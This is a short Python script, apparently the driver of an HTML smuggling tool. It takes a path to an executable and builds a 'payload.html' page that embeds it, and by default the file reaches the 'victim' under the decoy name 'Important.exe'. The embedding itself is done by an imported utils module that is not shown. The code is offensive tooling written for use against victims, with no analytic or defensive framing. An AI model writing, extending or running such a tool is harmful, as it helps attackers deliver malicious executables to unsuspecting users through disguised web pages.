import os
import sys
from utils import *

def main():
    print_banner()

    # Check if sufficient arguments are provided
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <path_to_executable> <output_html_filename (optional)> <downloaded_filename (optional)>")
        sys.exit(1)

    # Path to the executable to embed in the HTML file
    executable_path = sys.argv[1]

    # Output HTML filename, default to 'payload.html' in the current directory if not provided
    if len(sys.argv) >= 3:
        output_html_path = sys.argv[2]
    else:
        output_html_path = os.path.join(os.path.dirname(__file__), "payload.html")

    # Default filename the victim will see for the downloaded file, or use the provided one
    if len(sys.argv) >= 4:
        victim_download_filename = sys.argv[3]
    else:
        victim_download_filename = "Important.exe"

    # Path to the template directory
    template_dir = os.path.join(os.path.dirname(__file__), "template")

    # Check if the template directory exists
    if not os.path.exists(template_dir):
        print(f"[!] Template directory '{template_dir}' not found.")
        sys.exit(1)

    # Ensure the necessary template files exist
    check_template_files(template_dir)

    # Generate the HTML file using the provided executable, output path, and victim's download filename
    generate_html(executable_path, output_html_path, victim_download_filename)

    print(f"[+] HTML file '{output_html_path}' generated successfully.")

if __name__ == "__main__":
    main()
